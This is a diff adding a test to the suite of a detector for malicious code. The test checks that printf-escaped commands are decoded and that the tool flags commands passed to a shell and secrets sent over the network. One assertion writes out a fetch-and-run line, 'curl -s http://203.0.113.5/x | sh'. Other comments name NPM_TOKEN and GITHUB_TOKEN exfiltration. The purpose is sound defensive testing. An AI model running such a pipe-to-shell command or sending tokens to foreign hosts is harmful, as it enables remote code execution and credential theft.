@@ -2871,6 +2871,27 @@ test("no benign task in the corpus is flagged at medium or above (#88)", pack() 
   assert(caught >= floor, "recall fell: ${caught} of ${attacks} attacks at medium or above, the labels promise ${floor}")
 })
 
+test("printf escapes are decoded, handed commands read as shell, and a secret followed to the network (#89)", pack() {
+  stick dir = fresh("tests/fixtures/detection")
+  stick rated = corpus_audit(dir)
+  # m21: `$(printf '\x63\x75\x72\x6c')` is curl, so the line is a fetch-and-run.
+  assert(rated.m21.findings.any(pack(f) => f.rule == "fetch-run-sh" and f.says.contains("printf escapes decoded") and f.text.contains("curl -s http://203.0.113.5/x | sh")), "m21: ${json.stringify(rated.m21.findings)}")
+  # m10 and m26: the command handed to child_process or subprocess, built
+  # as the program builds it, is read as shell, raw address and all.
+  for t in ["m10", "m26"] {
+    assert(rated[t].findings.any(pack(f) => f.rule == "exfil-rawip" and f.says.contains("hands to a shell") and f.text.contains("203.0.113.5")), "${t}: ${json.stringify(rated[t].findings)}")
+  }
+  # m19 and m25: a token from the environment, sent to a host that is not
+  # its own service.
+  assert(rated.m19.findings.any(pack(f) => f.rule == "taint-secret-net" and f.says.contains("NPM_TOKEN")), "m19: ${json.stringify(rated.m19.findings)}")
+  assert(rated.m25.findings.any(pack(f) => f.rule == "taint-secret-net" and f.says.contains("GITHUB_TOKEN")), "m25: ${json.stringify(rated.m25.findings)}")
+  # Their benign twins say nothing: a token sent to its own service, a token
+  # read and never sent, colour escapes, a git or cargo command run.
+  for t in ["b25", "b26", "b27", "b28", "b29"] {
+    assert(rated[t].findings.is_empty(), "${t}: ${json.stringify(rated[t].findings)}")
+  }
+})
+
 # Every address an attack names, in its text or in what the audit decoded
 # from it (base64, hex, joined pieces), is in a documentation range (RFC 5737:
 # 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24) or under `.invalid` (RFC 2606),
